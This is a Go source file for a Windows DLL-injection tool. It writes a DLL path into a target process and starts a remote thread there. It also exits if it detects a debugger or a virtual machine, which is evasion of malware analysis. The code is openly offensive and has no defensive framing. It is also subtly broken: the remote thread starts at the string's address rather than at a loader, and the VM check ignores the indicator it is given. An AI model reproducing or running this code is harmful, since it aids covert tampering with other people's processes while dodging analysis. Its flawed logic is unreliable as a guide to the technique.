package main

import (
    "fmt"
    "os"
    "os/exec"
    "strconv"
    "strings"
    "syscall"
    "unsafe"
)

const (
    PROCESS_CREATE_THREAD       = 0x0002
    PROCESS_QUERY_INFORMATION   = 0x0400
    PROCESS_VM_OPERATION        = 0x0008
    PROCESS_VM_WRITE            = 0x0020
    PROCESS_VM_READ             = 0x0010
    MEM_COMMIT                  = 0x1000
    MEM_RESERVE                 = 0x2000
    PAGE_READWRITE              = 0x04
)

var kernel32 = syscall.NewLazyDLL("kernel32.dll")
var ntdll = syscall.NewLazyDLL("ntdll.dll")

var (
    openProcess       = kernel32.NewProc("OpenProcess")
    virtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
    writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
    createRemoteThread = kernel32.NewProc("CreateRemoteThread")
    rtlCreateUserThread = ntdll.NewProc("RtlCreateUserThread")
)

func main() {
    if len(os.Args) != 3 {
        fmt.Printf("Usage: %s <PID> <DLL_PATH>\n", os.Args[0])
        os.Exit(1)
    }

    if isBeingDebugged() || isRunningInVM() {
        fmt.Println("Debugger or VM detected. Exiting.")
        os.Exit(1)
    }

    pid, err := strconv.Atoi(os.Args[1])
    if err != nil {
        fmt.Println("Invalid PID:", err)
        os.Exit(1)
    }
    dllPath := os.Args[2]

    err = injectDLL(uint32(pid), dllPath)
    if err != nil {
        fmt.Println("DLL injection failed:", err)
    } else {
        fmt.Println("DLL injection succeeded.")
    }
}

func injectDLL(pid uint32, dllPath string) error {
    dllBytes := append([]byte(dllPath), 0)

    hProcess, err := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(hProcess)

    addr, err := virtualAlloc(hProcess, len(dllBytes))
    if err != nil {
        return err
    }

    err = writeMemory(hProcess, addr, dllBytes)
    if err != nil {
        return err
    }

    hThread, err := createThread(hProcess, addr)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(hThread)

    return nil
}

func virtualAlloc(hProcess syscall.Handle, size int) (uintptr, error) {
    addr, _, err := virtualAllocEx.Call(uintptr(hProcess), 0, uintptr(size), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    if addr == 0 {
        return 0, err
    }
    return addr, nil
}

func writeMemory(hProcess syscall.Handle, addr uintptr, data []byte) error {
    var written uintptr
    r, _, err := writeProcessMemory.Call(uintptr(hProcess), addr, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), uintptr(unsafe.Pointer(&written)))
    if r == 0 {
        return err
    }
    return nil
}

func createThread(hProcess syscall.Handle, addr uintptr) (syscall.Handle, error) {
    hThread, _, err := createRemoteThread.Call(uintptr(hProcess), 0, 0, addr, 0, 0, 0)
    if hThread == 0 {
        return 0, err
    }
    return syscall.Handle(hThread), nil
}

func isBeingDebugged() bool {
    var isDebuggerPresent bool
    procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
    ret, _, _ := procIsDebuggerPresent.Call(uintptr(unsafe.Pointer(&isDebuggerPresent)))
    return ret != 0
}

func isRunningInVM() bool {
    vmIndicators := []string{
        "VMware",
        "VirtualBox",
        "QEMU",
        "Hyper-V",
        "KVM",
        "Xen",
    }

    for _, indicator := range vmIndicators {
        if isIndicatorPresent(indicator) {
            return true
        }
    }
    return false
}

func isIndicatorPresent(indicator string) bool {
    cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer"))
    output, err := cmd.Output()
    if err != nil {
        return false
    }
    return strings.Contains(string(output), indicator)
}
